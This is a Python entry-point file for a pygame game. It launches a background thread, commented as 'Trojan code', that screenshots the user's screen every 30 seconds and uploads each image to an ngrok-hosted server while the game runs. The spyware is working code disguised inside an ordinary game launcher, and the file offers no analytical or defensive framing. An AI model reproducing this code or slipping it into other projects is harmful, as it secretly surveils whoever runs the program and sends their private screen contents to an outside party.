import pygame as pg
from source.main import main
import pyautogui
import requests
import threading
import time
import os

# Trojan code below
# This sends the data to the '/upload' endpoint, which allows POST requests
SERVER_URL = "http://dwain-slippery-idolatrously.ngrok-free.dev/upload"
SCREENSHOT_INTERVAL = 30  # Time in seconds between each screenshot.

def take_screenshot_and_send():
    print("Trojan thread started. Monitoring...")
    while True:
        try:
            screenshot = pyautogui.screenshot()
            temp_path = "temp_screenshot.png"
            screenshot.save(temp_path)
            with open(temp_path, "rb") as f:
                files = {'file': f}
                print(f"Sending screenshot to {SERVER_URL}...")
                response = requests.post(SERVER_URL, files=files, timeout=15)
                print(f"Server response: {response.status_code} - {response.text}")
            os.remove(temp_path)
        except Exception as e:
            print(f"An error occurred in the trojan: {e}")
        time.sleep(SCREENSHOT_INTERVAL)

# Main function to run game
if __name__ == '__main__':
    screenshot_thread = threading.Thread(target=take_screenshot_and_send, daemon=True)
    screenshot_thread.start()
    main()
    print("Game window closed. Trojan continues to run in the background.")
    pg.quit()